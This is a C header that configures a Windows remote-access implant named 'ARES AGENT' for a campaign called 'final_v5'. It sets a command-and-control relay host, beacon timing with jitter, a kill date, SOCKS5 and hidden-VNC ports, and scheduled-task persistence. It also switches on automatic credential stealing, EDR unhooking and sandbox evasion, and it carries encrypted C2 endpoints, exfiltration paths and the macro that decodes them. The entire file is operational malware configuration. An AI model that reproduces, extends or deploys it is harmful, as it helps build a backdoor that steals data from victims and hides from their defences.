/*
 *  ARES AGENT -- Campaign Configuration (v3.2)
 *  Campaign:  final_v5
 *  Generated: 2026-05-27 22:29
 *  C2:        test-relay.workers.dev:443 (HTTPS)
 *  XOR Key:   0x16
 */
#ifndef ARES_CONFIG_H
#define ARES_CONFIG_H
#include <windows.h>

#define CFG_CAMPAIGN_ID       "e5205e237d34"
#define CFG_CAMPAIGN_NAME     "final_v5"
#define CFG_XOR_KEY           0x16
#define STR_ENC_KEY           0x16  /* W-3: compile-time string encryption key */

#define CFG_SLEEP_MS          30000
#define CFG_JITTER_PCT        50
#define CFG_KILL_DATE_TS      1782487741

#define CFG_C2_PORT           443
#define CFG_C2_COUNT          1
#define CFG_SOCKS5_PORT       51504
#define CFG_HVNC_PORT         13832

#define CFG_AUTO_PERSIST      0
#define CFG_PERSIST_METHOD    "schtask"
#define CFG_AUTO_STEAL        1
#define CFG_AUTO_UNHOOK       1
#define CFG_SANDBOX_CHECK     1

#define CFG_USE_AES           1  /* v3.9: AES-256-GCM config encryption */

/* --- XOR-encoded path configs --- */
static const BYTE CFG_PATH_REGISTER[] = {0x3e,0x6f,0x5f,0x38,0x6a,0x06,0x5d,0xb5,0xfd,0xc1,0xbf,0xab,0x90,0x8d,0x73,0x40,0x58};
#define CFG_PATH_REGISTER_LEN 17
static const BYTE CFG_PATH_BEACON[] = {0x3e,0x6f,0x5f,0x38,0x6a,0x06,0x5d,0xb5,0xe1,0xc1,0xb2,0xbc,0x89,0x8a,0x62,0x53,0x55};
#define CFG_PATH_BEACON_LEN 17
static const BYTE CFG_PATH_RESULT[] = {0x3e,0x6f,0x5f,0x38,0x6a,0x06,0x5d,0xb5,0xe8,0xca,0xb2,0xa2,0x84,0x9c,0x6e,0x51,0x52};
#define CFG_PATH_RESULT_LEN 17
static const BYTE CFG_PATH_EXFIL[] = {0x3e,0x6f,0x5f,0x38,0x6a,0x06,0x5d,0xb5,0xec,0xd2,0xb6,0xa0,0x89,0x9b};
#define CFG_PATH_EXFIL_LEN 14

/* --- XOR-encoded hosts (fallback when CFG_USE_AES is not defined) --- */
#ifndef CFG_USE_AES
static const BYTE CFG_C2_0[] = {0x65,0x69,0x48,0x22,0x68,0x02,0x0a,0xf6,0xe8,0xdd,0xfd,0xb9,0x92,0x9a,0x6c,0x57,0x53,0x2f,0x65,0x02,0xf0,0xf6};
#define CFG_C2_0_LEN 22
#endif

/* --- AES-256-GCM encrypted hosts (primary) --- */
#ifdef CFG_USE_AES
/* AES-256-GCM key: SHA256(campaign_id + compile_timestamp) */
static const BYTE CFG_AES_KEY[] = {0x09,0x68,0xfa,0xca,0x13,0x98,0x5d,0xec,0x3c,0xd7,0x0f,0x13,0x66,0xa6,0x47,0x5b,0x18,0x96,0x31,0x2c,0x03,0x7e,0xb0,0xc4,0xb3,0x38,0xcc,0xc8,0x87,0x6f,0xba,0x8f};
static const BYTE CFG_AES_NONCE[] = {0x04,0x46,0x48,0xe0,0x15,0x62,0xce,0xc8,0x15,0xcf,0xec,0x7d};
static const BYTE CFG_C2_ENC[] = {0x6f,0xed,0xa0,0xe3,0xaf,0xa2,0xfe,0x16,0xaa,0x39,0x6d,0xd2,0x2f,0x4f,0x0d,0x14,0xc5,0x65,0x32,0xdb,0x4e,0x86,0x57,0x17,0xf3,0x1e,0xb0,0xd7,0x2f,0xf3,0x98,0x25,0x83,0x3f,0x77,0x70,0xd3,0x98};
#define CFG_C2_ENC_LEN 38
#endif

#define CFG_USE_HTTP          0

/* --- Dead Drop Resolver (fallback C2 if primary CF Worker down) --- */
#define CFG_DEAD_DROP_ENABLED       0
#define CFG_DEAD_DROP_URL_1         ""
#define CFG_DEAD_DROP_URL_2         ""
#define CFG_DEAD_DROP_MARKER_START  "{{"
#define CFG_DEAD_DROP_MARKER_END    "}}"
#define CFG_TLS_INSECURE      0  /* v3.2: 0=verify certs (production), 1=ignore (dev only) */

#ifdef CFG_USE_AES
#define ARES_DECODE_CONFIG(s) do { \
    BYTE _aes_buf[23]; \
    if (Ares_AES_GCM_Decrypt(CFG_C2_ENC, CFG_C2_ENC_LEN, CFG_AES_KEY, CFG_AES_NONCE, _aes_buf)) { \
        int _hi = 0, _hp = 0; \
        for (DWORD _ai = 0; _ai <= 21; _ai++) { \
            if (_aes_buf[_ai] == 0 || _ai == 21) { \
                int _el = (_aes_buf[_ai] == 0) ? (int)(_ai - _hp) : (int)(_ai - _hp + 1); \
                memcpy((s)->config.c2_endpoints[_hi], _aes_buf + _hp, _el); \
                (s)->config.c2_endpoints[_hi][_el] = '\0'; \
                _hi++; _hp = (int)_ai + 1; \
            } \
        } \
        (s)->config.c2_count = _hi; \
    } \
    _xd((s)->config.path_register, CFG_PATH_REGISTER, CFG_PATH_REGISTER_LEN, CFG_XOR_KEY); \
    _xd((s)->config.path_beacon, CFG_PATH_BEACON, CFG_PATH_BEACON_LEN, CFG_XOR_KEY); \
    _xd((s)->config.path_result, CFG_PATH_RESULT, CFG_PATH_RESULT_LEN, CFG_XOR_KEY); \
    _xd((s)->config.path_exfil, CFG_PATH_EXFIL, CFG_PATH_EXFIL_LEN, CFG_XOR_KEY); \
} while(0)
#else
#define ARES_DECODE_CONFIG(s) do { \
    _xd((s)->config.c2_endpoints[0], CFG_C2_0, CFG_C2_0_LEN, CFG_XOR_KEY); \
    (s)->config.c2_count = 1; \
    _xd((s)->config.path_register, CFG_PATH_REGISTER, CFG_PATH_REGISTER_LEN, CFG_XOR_KEY); \
    _xd((s)->config.path_beacon, CFG_PATH_BEACON, CFG_PATH_BEACON_LEN, CFG_XOR_KEY); \
    _xd((s)->config.path_result, CFG_PATH_RESULT, CFG_PATH_RESULT_LEN, CFG_XOR_KEY); \
    _xd((s)->config.path_exfil, CFG_PATH_EXFIL, CFG_PATH_EXFIL_LEN, CFG_XOR_KEY); \
} while(0)
#endif

#endif
